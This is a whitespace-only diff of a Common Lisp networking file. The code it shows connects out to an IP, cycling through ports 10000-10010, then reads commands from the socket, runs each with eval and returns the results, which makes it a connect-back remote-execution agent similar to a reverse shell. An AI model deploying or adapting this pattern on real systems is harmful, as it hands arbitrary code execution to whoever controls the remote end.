@@ -34,10 +34,10 @@
         (len (length buffer)))
     ;; payload cannot be bigger than 2**32 bytes (4GB)
     (assert (< len *max-payload-length*))
-    
+
     ;; write the length of the payload
     (write-sequence (int->bytes len 4) stream)
-    
+
     ;; write the payload
     (write-sequence buffer stream)
 
@@ -48,15 +48,15 @@
   (usocket:wait-for-input socket)
 
   (format t "[+] Starting to read...~%")
-  
+
   (let ((stream (usocket:socket-stream socket))
         (buffer (make-array *buffer-size*
                             :element-type *element-type*))
-        (result (make-array 0 
+        (result (make-array 0
                             :element-type *element-type*
                             :adjustable t
                             :fill-pointer t)))
-    
+
     (loop with payload-length = (read-payload-length stream)
           with total-read = 0
           for i = 0 then (1+ i)
@@ -77,10 +77,10 @@
 
 (defun search-for-port (ip &key (start 10000) (end 10010))
   (loop for port = start then (1+ port)
-        for socket = (ignore-errors 
-                       (usocket:socket-connect 
+        for socket = (ignore-errors
+                       (usocket:socket-connect
                         ip port :element-type *element-type*))
-        do (format t "[+] Trying to connect to ~a:~a... ~a~%" 
+        do (format t "[+] Trying to connect to ~a:~a... ~a~%"
                    ip port socket)
         if socket do (return (values socket port))
         if (= port end) do (setf port (1- start))
@@ -100,10 +100,10 @@
                (with-input-from-string (s command)
                  (let ((result (eval (read s))))
                    (format t "[+] Result: \"~a\"~%" result)
-                   (send-data socket 
+                   (send-data socket
                               (trivial-utf-8:string-to-utf-8-bytes
                                (format nil "~a" result)))))))
-    
+
     (finish-output (usocket:socket-stream socket))
     (usocket:socket-close socket)))
 
